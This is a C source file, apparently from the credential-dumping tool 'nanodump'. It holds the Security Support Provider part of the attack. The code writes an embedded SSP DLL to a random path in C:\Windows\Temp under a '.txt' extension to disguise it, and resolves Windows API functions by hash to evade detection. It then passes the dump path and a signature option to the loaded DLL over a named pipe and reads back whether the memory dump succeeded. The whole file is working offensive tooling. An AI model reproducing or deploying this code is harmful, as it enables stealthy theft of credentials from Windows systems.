#include "ssp/ssp_utils.h"
#include "utils.h"
#include "pipe.h"

BOOL generate_random_dll_path(
    OUT LPSTR* random_path)
{
    BOOL    ret_val   = FALSE;
    LPSTR   rand_path = NULL;
    ULONG32 rand_num  = 0;
    CHAR    c         = 0;

    // intializes the random number generator
    time_t t;
    srand((unsigned) time(&t));

    rand_path = intAlloc(MAX_PATH + 1);
    if (!rand_path)
    {
        malloc_failed();
        goto cleanup;
    }

    strncpy(rand_path, "C:\\Windows\\Temp\\", MAX_PATH);

    for (int i = 0; i < DLL_NAME_LENGTH; ++i)
    {
        rand_num = rand() % 52;
        if (rand_num < 26)
            c = 97 + rand_num;
        else
            c = 65 - 26 + rand_num;
        rand_path[16 + i] = c;
    }

    // the extension does not need to be '.dll'
    strncat(rand_path, ".txt", MAX_PATH);

    *random_path = rand_path;

    ret_val = TRUE;

cleanup:
    if (!ret_val && rand_path)
        intFree(rand_path);
    if (!ret_val)
        *random_path = NULL;

    return ret_val;
}

BOOL write_ssp_dll(
    IN LPSTR ssp_dll_path,
    IN unsigned char nanodump_ssp_dll[],
    IN unsigned int nanodump_ssp_dll_len)
{
    BOOL           ret_val              = FALSE;
    BOOL           success              = FALSE;
    WCHAR          wcFilePath[MAX_PATH] = { 0 };
    UNICODE_STRING file_path            = { 0 };

    file_path.Buffer        = wcFilePath;
    file_path.Length        = 0;
    file_path.MaximumLength = 0;

    get_full_path(&file_path, ssp_dll_path);

    success = write_file(
        &file_path,
        nanodump_ssp_dll,
        nanodump_ssp_dll_len);
    if (!success)
    {
        PRINT_ERR("Failed to write the DLL to %s", ssp_dll_path);
        goto cleanup;
    }

    ret_val = TRUE;

cleanup:
    return ret_val;
}

#if PASS_PARAMS_VIA_NAMED_PIPES == 1

BOOL send_parameters_and_get_result(
    IN LPSTR dump_path,
    IN BOOL use_valid_sig,
    OUT PBOOL dump_worked)
{
    BOOL   ret_val = FALSE;
    BOOL   success = FALSE;
    HANDLE hPipe   = NULL;

    Sleep_t Sleep = NULL;

    Sleep = (Sleep_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        Sleep_SW2_HASH,
        0);
    if (!Sleep)
    {
        api_not_found("Sleep");
        goto cleanup;
    }

    for (int i = 0; i < 5; ++i)
    {
        // let's try to connect to the named pipe
        success = client_connect_to_named_pipe(
            IPC_PIPE_NAME,
            &hPipe);
        if (!success)
        {
            // sleep half a second and try again
            if (i != 4)
            {
                DPRINT("could not connnect to the named pipe, sleeping and trying again...");
            }
            Sleep(500);
            continue;
        }
        break;
    }

    if (!success)
    {
        PRINT_ERR("Could not connect to the named pipe, the DLL does not seem to have been loaded");
        goto cleanup;
    }

    success = client_send_arguments_from_pipe(
        hPipe,
        dump_path,
        use_valid_sig,
        FALSE);
    if (!success)
        goto cleanup;

    success = client_recv_success(
        hPipe,
        dump_worked);
    if (!success)
        goto cleanup;

    ret_val = TRUE;

cleanup:
    if (hPipe)
        NtClose(hPipe);

    return ret_val;
}

#endif
